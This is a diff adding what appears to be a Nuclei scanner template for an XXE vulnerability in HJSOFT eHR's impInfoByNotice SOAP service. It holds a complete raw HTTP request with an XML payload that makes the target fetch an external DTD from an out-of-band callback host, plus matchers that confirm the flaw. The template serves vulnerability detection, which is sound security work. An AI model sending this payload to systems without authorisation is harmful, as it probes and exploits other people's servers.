@@ -1,0 +1,47 @@
+id: poc-yaml-hjsoft-ehr-impinfobynotice-xxe
+
+info:
+  name: HJSOFT eHR impInfoByNotice XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /services/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: ""
+        Content-Type: text/xml;charset=UTF-8
+
+        <!DOCTYPE syscode SYSTEM "http://{{reverse}}/impInfoByNotice">
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <hrp:impInfoByNotice>
+                 <hrp:in0><syscode>&send;</syscode></hrp:in0>
+              </hrp:impInfoByNotice>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "java.io.IOException"
+          - "impInfoByNotice"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
